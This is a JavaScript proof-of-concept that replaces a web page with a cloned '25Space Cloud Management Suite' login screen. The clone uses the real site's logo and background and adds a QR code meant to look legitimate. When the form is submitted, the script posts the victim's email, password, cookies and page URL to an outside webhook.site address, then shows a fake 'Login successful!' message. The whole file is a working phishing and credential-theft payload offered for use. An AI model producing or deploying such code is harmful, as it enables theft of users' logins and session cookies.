// Updated Full-Page Clone PoC with Real QR Code
// Added a dynamically generated QR code pointing to the site (looks legit)
// Logo: Using common path - if not exact, inspect real page and replace
// Background: Kept as is - if not loading, replace url() with exact from inspect
// QR now shows properly!

(function() {
  const webhookUrl = 'https://webhook.site/acaf7007-fbc2-462c-b96d-28b307aefb8b'; // Your webhook here

  const fullPageHTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cloud Management Suite - Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-image: url('https://cloud.25space.com/assets/images/login-bg.jpg'); /* Try this common path, or inspect for exact */
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      color: white;
      height: 100vh;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      display: flex;
      width: 90%;
      max-width: 1200px;
      height: 80vh;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
    }
    .left {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 4rem;
    }
    .left h1 {
      font-size: 4rem;
      font-weight: 300;
      margin-bottom: 1.5rem;
    }
    .left p {
      font-size: 1.2rem;
      margin-bottom: 3rem;
      max-width: 70%;
    }
    .qr-code {
      width: 220px;
      height: 220px;
      border: 8px solid rgba(255,255,255,0.8);
      border-radius: 10px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.4);
    }
    .right {
      flex: 1;
      background: rgba(0, 0, 0, 0.8);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 4rem;
    }
    .logo {
      width: 80px;
      margin-bottom: 1.5rem;
    }
    .right h2 {
      font-size: 1.8rem;
      font-weight: 400;
      margin-bottom: 2.5rem;
      text-align: center;
    }
    form {
      width: 80%;
      max-width: 400px;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 1rem;
      margin-bottom: 1.2rem;
      background: #444;
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 1.1rem;
    }
    input::placeholder {
      color: #aaa;
    }
    .remember {
      display: flex;
      justify-content: space-between;
      margin-bottom: 2rem;
      font-size: 0.95rem;
    }
    .remember label {
      display: flex;
      align-items: center;
    }
    .remember input[type="checkbox"] {
      margin-right: 0.5rem;
    }
    .problems-link {
      color: #ff9900;
    }
    button {
      width: 100%;
      padding: 1.1rem;
      background: #ff9900;
      color: black;
      border: none;
      border-radius: 30px;
      font-size: 1.2rem;
      font-weight: bold;
      cursor: pointer;
    }
    .create-account {
      text-align: center;
      margin-top: 1.5rem;
      font-size: 0.95rem;
    }
    .create-link {
      color: #ff9900;
    }
    footer {
      position: fixed;
      bottom: 1rem;
      width: 100%;
      text-align: center;
      font-size: 0.8rem;
      color: #aaa;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <h1>Good morning!</h1>
      <p>Use 25Space across any device on the go. Scan the QR code to continue on other devices.</p>
      <img id="qrCode" class="qr-code" alt="QR Code">
    </div>
    <div class="right">
      <img src="https://cloud.25space.com/assets/images/logo.png" alt="25Space Logo" class="logo" onerror="this.style.display='none'">
      <h2>Cloud Management Suite.</h2>
      <form id="loginForm">
        <input type="email" placeholder="Email" required>
        <input type="password" placeholder="Password" required>
        <div class="remember">
          <label><input type="checkbox"> Remember me</label>
          <a href="#" class="problems-link">Problems with login?</a>
        </div>
        <button type="submit">Sign in</button>
        <div class="create-account">
          Don't have an account? <a href="#" class="create-link">Create an account</a>
        </div>
      </form>
    </div>
  </div>
  <footer>© 2015-2025 25space.com - Legal - Privacy - About - Health</footer>

  <script>
    // Generate real-looking QR code dynamically
    const qr = document.getElementById('qrCode');
    qr.src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(window.location.origin);

    // Exfiltration
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const data = {
        email: this.querySelector('input[type="email"]').value,
        password: this.querySelector('input[type="password"]').value,
        cookies: document.cookie,
        url: window.location.href
      };
      fetch('${webhookUrl}', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
      }).then(() => {
        alert('Login successful!');
        // Or window.location = '/dashboard.html'; for more realism
      });
    });
  </script>
</body>
</html>`;

  document.open();
  document.write(fullPageHTML);
  document.close();
})();
